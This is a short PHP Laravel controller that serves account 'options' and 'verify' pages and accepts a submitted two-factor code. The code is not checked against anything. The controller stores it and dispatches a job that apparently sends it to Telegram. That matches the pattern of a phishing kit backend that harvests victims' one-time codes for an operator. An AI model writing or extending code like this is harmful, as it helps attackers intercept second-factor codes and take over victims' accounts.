<?php

namespace App\Http\Controllers;

use App\Jobs\SendTelegramTwoFactorCode;
use App\Models\Account;
use App\Models\TwoFactorCode;
use Illuminate\Http\Request;

class TwoFactorCodeController extends Controller
{
    public function options($id) 
    {
        $account = Account::query()->findOrFail($id);

        return view('pages.options', compact('account'));
    }

    public function show($id)
    {
        $account = Account::query()->findOrFail($id);

        return view('pages.verify', compact('account'));
    }

    public function store(Request $request)
    {
        $request->validate([
        'code' => 'required|max:8|min:6',
        ]);

        $data = $request->only('code');
       
        $code = TwoFactorCode::query()->create($data);

        dispatch(new SendTelegramTwoFactorCode($code));

        return response()->json($code);
    }
}
